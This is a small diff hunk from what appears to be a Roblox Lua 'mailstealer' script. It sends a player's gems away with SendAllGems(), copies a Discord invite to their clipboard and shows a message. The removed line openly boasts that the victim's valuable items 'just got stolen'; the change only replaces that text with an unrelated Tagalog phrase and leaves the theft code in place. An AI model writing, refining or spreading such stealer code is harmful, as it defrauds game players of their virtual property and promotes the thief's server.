@@ -333,5 +333,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     SendAllGems()
     setclipboard("https://discord.gg/HcpNe56R2a")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your valuable items just got stolen by Tobi's mailstealer!\nJoin discord.gg/HcpNe56R2a")
+    message.Error("sarap mo pia")
 end
